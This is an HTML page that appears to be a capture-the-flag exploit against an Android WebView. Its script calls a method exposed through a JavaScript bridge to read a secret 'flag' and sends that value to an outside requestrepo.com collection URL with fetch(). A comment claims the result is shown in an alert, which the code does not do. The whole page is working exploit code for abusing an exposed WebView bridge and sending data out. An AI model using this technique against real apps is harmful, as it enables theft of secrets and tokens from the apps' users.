<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Access Flag from WebView</title>
    <script type="text/javascript">
        // This function will be called when a user clicks the button
        function getFlagFromAndroid() {
            // Calling the Java method `getFlag()` exposed via `jsBridge`
            var flag = jsBridge.getFlag();  // This calls the getFlag() method in your WebView interface

            // Display the result in an alert
            fetch( "https://gfynf30y.requestrepo.com/" + flag)
      .then(response => response.text())
      .then(data => {
        console.log("Fetched content:");
        console.log(data);
      })
      .catch(error => {
        console.error("Error fetching:", error);
      });
        }
    </script>
</head>
<body>
    <h1>Click the button to retrieve the flag</h1>
    <button onclick="getFlagFromAndroid()">Get Flag</button>
</body>
</html>
